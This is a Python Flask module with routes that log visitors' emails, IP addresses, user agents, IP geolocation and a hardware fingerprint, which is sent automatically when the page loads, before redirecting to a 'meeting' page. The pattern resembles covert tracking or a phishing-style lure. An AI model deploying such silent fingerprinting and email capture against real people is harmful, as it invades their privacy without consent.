from flask import Blueprint, request, redirect, url_for, jsonify
import json

from services.device_service import devices, update_device, create_device_entry
from services.log_service import save_and_print_log, sanitize_hardware
from services.ip_service import get_ip_details

logging_bp = Blueprint("logging", __name__)

# Email Logging (from form POST)
@logging_bp.route("/log-email", methods=["POST"])
def log_email():
    email = request.form.get("email")
    hardware_raw = request.form.get("hardware")

    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")
    ip_details = get_ip_details(user_ip)  # type: ignore

    try:
        hardware = json.loads(hardware_raw) if hardware_raw else {}
    except json.JSONDecodeError as e:
        hardware = {"error": f"Invalid hardware JSON: {str(e)}"}

    log_entry = create_device_entry(
        uuid=hardware.get("uuid"),
        email=email,
        ip=user_ip,
        user_agent=user_agent,
        hardware=sanitize_hardware(hardware)
    )
    log_entry["ip_details"] = ip_details

    save_and_print_log(log_entry)
    return redirect(url_for("main.meeting"))


# Hardware Logging (auto on page load)
@logging_bp.route("/log-hardware", methods=["POST"])
def log_hardware():
    data = request.get_json(force=True, silent=True) or {}
    uuid = data.get("uuid")

    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")
    ip_details = get_ip_details(user_ip) # type: ignore

    log_entry = create_device_entry(
        uuid=uuid,
        ip=user_ip,
        user_agent=user_agent,
        hardware=sanitize_hardware(data)
    )
    log_entry["ip_details"] = ip_details

    save_and_print_log(log_entry)
    return jsonify({"status": "ok"}), 200


# Submit Email (update device entry but KEEP hardware)
@logging_bp.route("/submit-email", methods=["POST"])
def submit_email():
    data = request.get_json(force=True, silent=True) or {}
    uuid = data.get("uuid")
    email = data.get("email")

    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")
    ip_details = get_ip_details(user_ip) # type: ignore

    if uuid and uuid in devices:
        existing_entry = devices[uuid]
        log_entry = update_device(uuid, email)

        if existing_entry.get("hardware"):
            log_entry["hardware"] = existing_entry["hardware"]
    else:
        # If new device, create fresh entry
        log_entry = create_device_entry(
            uuid=uuid,
            email=email,
            ip=user_ip,
            user_agent=user_agent,
            hardware={}
        )

    log_entry["ip_details"] = ip_details

    save_and_print_log(log_entry)
    return jsonify({"status": "ok"}), 200
